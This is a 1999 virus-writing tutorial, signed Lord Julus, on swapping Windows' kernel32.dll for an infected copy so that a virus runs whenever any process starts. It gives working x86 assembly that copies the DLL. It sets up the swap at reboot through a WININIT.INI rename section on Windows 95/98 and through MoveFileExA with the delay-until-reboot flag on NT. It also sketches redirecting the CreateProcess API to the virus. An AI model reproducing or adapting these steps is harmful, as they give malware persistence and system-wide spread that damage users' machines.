  __________________________________________________________________________
 (__________________________________________________________________________)
 { __ }   { __ }        |                            |        { __ }   { __ }
  |\\|     |\\|    .----O----------------------------O----.    |//|     |//|
  |\\|     |\\|    |        Replacing Kernel32.dll        |    |//|     |//|
  |\\|     |\\|    `--------------------------------------'    |//|     |//|
 {____}   {____}                                              {____}   {____}


        ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
        ³  Foreword  ³
        ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ

        Hi!  First  of  all,  let me brief you that this is only a small part
 from what is to be a whole new other method of being resident under Win32 then
 those  presented  until  here.  Let's see what is the main issue behind this
 stuff...

        Well,  as I explained before, all Win32 applications are running in a
 sort  of  virtual  space  where  all the needed Win32 apis are mapped inside
 their  corresponding carriers, e.g., the DLL files. If you take a quick look
 inside the Windows System directory, you find out that actually 90% of it is
 full with different dll files. These files are the ones mapped by the system
 at  each   process  startup. And these files exist in only *one* copy on the
 hard disk. The copy however is shared by all the applications we calling the
 apis.  Are  you  coming to see a pattern here? Well, if all applications use
 the  same  dll from the harddisk, then, why can't we infect the dll's and so
 whenever  an application is started it will map the infected DLL and be able
 to  spread it... And what better dll to use this technique is there then the
 kernel32 itself? Imagine that you infected the kernel32.dll file, by placing
 your  virus  at it's end and you redirected the address of the CreateProcess
 api  to  point  to  your  virus? Well... whenever an application is started,
 first our virus will run and then it will return to host continuing the job.

        Isn't  this a great idea? Was it done already? Yep... By Virogen, for
 example...  That is why I will not even insist on how to infect the kernel32
 (I will discuss this in another tutorial), but I will talk here about how to
 really do it...

        Check the file COPYKERN.ASM for the full example.

 ÄÄÄÄÄÙ Problem ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


        The  first problem that appears is the following: since the system is
 started,  the Kernel32.dll is mapped into *all* Win32 applications to assure
 the  existance  of  the  ExitProcess  api. If the dll is already mapped, you
 cannot  delete  it, modify it or even rename it... Why? Because it is shared
 and used... Here start our problems: we know what we want: to infect the DLL
 file. We don't know how are we able to modify it...

 ÄÄÄÄÄÙ Solving ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

        The first idea is, of course, to make a copy of the kernel32.dll file
 and  copy  it  under  another name. Easy to do... (check the example later).
 Then  we  must  copy  our  new  infected  file over the old kernel32... How?
 Windows  doesn't  allow  us to do it... The idea is to tell Windows to do it
 for  us, the next time the system reboots! How? Easy! The key is to create a
 file  in  the  windows  directory  called  WININIT.INI  with  the  following
 structure:

 [Rename]
 NUL=C:\WINDOWS\SYSTEM\KERNEL32.DLL
 C:\WINDOWS\SYSTEM\KERNEL32.DLL=C:\WINDOWS\SYSTEM\KERNEL32.LLD

        I   assumed   that   the   name   of  our  infected  kernel32.dll  is
 kernel32.lld...

        This is the situation for Windows95/98. For WindowsNT it is much
 simpler as we will see below.

        Let us see step by step how can we achieve this...

        First, our declarations:

 szWinInitFile db 260 dup (0)     ; will become c:\windows\wininit.ini
 wininit db "\\WININIT.INI",0     ;
 nul db "NUL",0                   ; "NUL" string
 rename db "Rename", 0            ; "Rename" string
 szSystemKernel1 db 260 dup (0)   ; original file
 szSystemKernel2 db 260 dup (0)   ; infected file
 kernel_old db "\KERNEL32.DLL", 0 ;
 kernel_new db "\KERNEL32.LLD", 0 ;

        And now let's code:

        First get the name of the System directory for each file:

       push 260                    ;
       push offset szSystemKernel1 ;
       call GetSystemDirectoryA    ;
                                   ;
       push 260                    ;
       push offset szSystemKernel2 ;
       call GetSystemDirectoryA    ;

        Add the names of the two files after each directory:

       push offset kernel_old      ;
       push offset szSystemKernel1 ;
       call lstrcat                ;
                                   ;
       push offset kernel_new      ;
       push offset szSystemKernel2 ;
       call lstrcat                ;

       And copy the old kernel32 under the new name.

       push 0                      ;
       push offset szSystemKernel2 ;
       push offset szSystemKernel1 ;
       call CopyFileA              ;

       At   this   point   you   can  start  to  open  the  file  pointed  by
 szSystemKernel2  and  infect  it.  This  will  be  the  infected copy of the
 kernel32.  Or,  if  you want to test this technique, use my copykern example
 and  write  down some code to replace the string "This program cannot be run
 in  DOS  mode"  with  something  like: "Testing for kernel32 replacement"...
 After running the example look at the kernel32 and see it is modified...


        Windows95/98 approach
        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

        Next  step  is to create the Wininit.ini file. Get Windows directory,
 and create the file name:

       push 260                    ;
       push offset szWinInitFile   ;
       call GetWindowsDirectoryA   ;
       push offset wininit         ;
       push offset szWinInitFile   ;
       call lstrcat                ;

        And now write down the profile string inside the init file:

       push offset szWinInitFile   ; First annulate the name of the
       push offset szSystemKernel1 ; existing file
       push offset nul             ;
       push offset rename          ;
       call WritePrivateProfileStringA
                                   ;
       push offset szWinInitFile   ; and now tell Windows about the
       push offset szSystemKernel2 ; rename...
       push offset szSystemKernel1 ;
       push offset rename          ;
       call WritePrivateProfileStringA

       push 0
       call ExitProcess


        At this point, please look inside the c:\windows directory and search
 for  the  WININIT.INI file. It is there and it includes exactly the layout I
 talked about before...

        What  will  happen  when  Windoze is restarted? The kernel32.lld file
 will  replace  the  original  kernel32.dll file and this is exactly what our
 goal  was: replace the original kernel32.dll file with an infected copy with
 the same name and in the same directory...

        The  file  WIINIT.INI  gets  automatically erased after all the stuff
 inside  was  fulfilled, e.g. at the reboot after the file renaming. Actually
 this  WININIT.INI  file is used by most setup files to register their files.
 You can find more about it's usage in Microsoft's docs.


        WindowsNT approach
        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

        For WindowsNT it is much easier to do the above thing because there
 exist  an api which allows us to copy files after the system reboot. The api
 is  MoveFileExA  and  the  flag  to  use  is  MOVE_FILE_AFTER_REBOOT. Pretty
 obvious, duh?

        Here is how we issue our call:

        push flags
        push offset newname
        push offset oldname
        call MoveFileExA

        The flags specified must be:

        MOVEFILE_REPLACE_EXISTING + MOVEFILE_DELAY_UNTIL_REBOOT

        After  the  system  reboots  the  same  thing  as in the Windows95/98
 example  will  happen.  The  infected kernel32.dll will replace the original
 kernel32.

        From  now  on, every process that starts up will map the new infected
 kernel32...

        The  subject  of  this  small  article  was  only to show how you can
 overwrite the Kernel32.dll file... It was fulfilled...

        As  a  sidenote to help you: if you don't know exactly or you are not
 sure  on  your infection technique, before starting to do this make a backup
 copy of the kernel32 file. If you mess things up just restart in MS-DOS only
 and replace the file from the backup.

        All the Best to all,


                                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                                            ³   Lord Julus - 1999    Û
                                            ÀÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
